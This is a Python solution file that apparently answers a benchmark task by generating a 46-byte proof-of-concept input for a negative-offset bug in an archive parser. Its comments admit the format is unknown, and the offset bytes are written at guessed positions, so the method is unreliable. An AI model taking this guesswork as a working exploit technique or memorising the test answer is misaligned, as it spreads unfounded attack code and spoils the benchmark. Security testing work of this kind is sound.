import os
import struct
import tempfile
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description: 
        # "malformed input files can cause the archive start offset to become negative"
        # This suggests we need to craft an archive file where the offset field
        # is set to a negative value (or large positive value that becomes negative when interpreted as signed).
        # Common archive formats use signed 32-bit integers for offsets.
        # We'll create a minimal tar-like archive with a negative offset.
        
        # Create a tar-like header with modified offset field
        # Standard tar header is 512 bytes, but we can make it smaller if format allows
        # Since ground-truth is 46 bytes, we'll create minimal 46-byte structure
        
        # Approach: Create a file where offset field (likely at specific position) 
        # contains value that when read as signed 32-bit is negative
        # Common vulnerability: Using signed offset for buffer size calculation
        # causing integer underflow leading to heap buffer overflow
        
        # We'll use 0xFFFFFFFF (-1 in signed 32-bit) for offset
        negative_offset = 0xFFFFFFFF
        
        # Build a minimal archive structure:
        # 1. Some header/magic bytes (if format requires)
        # 2. Offset field at expected position set to negative value
        # 3. Minimal data to trigger the vulnerable code path
        
        # Since we don't know exact format, we'll try to create a plausible
        # archive header with common field positions
        poc = bytearray()
        
        # Common archive formats often have offset at position 0x94 or similar
        # We'll create 46 bytes with offset at position 20-23 (example)
        # Fill with recognizable pattern for debugging
        for i in range(46):
            poc.append(0x41 + (i % 26))  # Pattern A-Z
        
        # Insert negative offset at likely position (adjust based on common formats)
        # Many archive parsers use 4-byte little-endian offsets
        offset_position = 20
        if offset_position + 4 <= 46:
            poc[offset_position:offset_position+4] = struct.pack('<I', negative_offset)
        
        # Alternative: If the format uses big-endian
        poc[24:28] = struct.pack('>I', negative_offset)
        
        # Another common position for offsets in archive headers
        poc[32:36] = struct.pack('<I', negative_offset)
        
        # Set a small valid size field to ensure basic parsing succeeds
        # before hitting the negative offset
        poc[12:16] = struct.pack('<I', 100)  # Example size
        
        return bytes(poc[:46])  # Ensure exact 46 bytes